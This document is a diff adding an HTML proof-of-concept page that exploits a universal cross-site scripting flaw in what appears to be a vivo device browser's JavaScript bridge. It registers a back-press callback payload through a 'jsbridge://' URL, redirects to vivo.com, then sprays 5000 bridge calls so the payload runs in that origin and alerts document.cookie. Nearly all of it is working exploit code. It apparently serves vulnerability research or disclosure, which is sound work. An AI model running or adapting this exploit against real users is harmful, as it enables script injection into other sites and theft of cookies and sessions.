@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>POC</title>
+</head>
+<body>
+<h3 id="status">UXSS Exploiting...</h3>
+<script>
+(function() {
+    var TARGET = "https://www.vivo.com/";
+
+    var payload = "if(document.domain.indexOf('vivo')>-1)alert(document.cookie)//";
+    var data = JSON.stringify({backPressCallback: payload});
+
+    function callBridge(url) {
+        var iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = url;
+        document.body.appendChild(iframe);
+        setTimeout(function() {
+            if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
+        }, 50);
+    }
+
+    var registerUrl = 'jsbridge://javacommon/registerBack?callback=x&data=' + encodeURIComponent(data);
+    callBridge(registerUrl);
+
+    location.replace(TARGET);
+
+    var i = 0;
+    var spray = setInterval(function() {
+        callBridge('jsbridge://javacommon/webBackPress?callback=x&data=' + encodeURIComponent('{}'));
+        i++;
+        if (i >= 5000) clearInterval(spray);
+    }, 1);
+
+    setTimeout(function() {
+        var s = document.getElementById('status');
+        if (s) s.innerText = 'Done.';
+    }, 15000);
+})();
+</script>
+</body>
+</html>
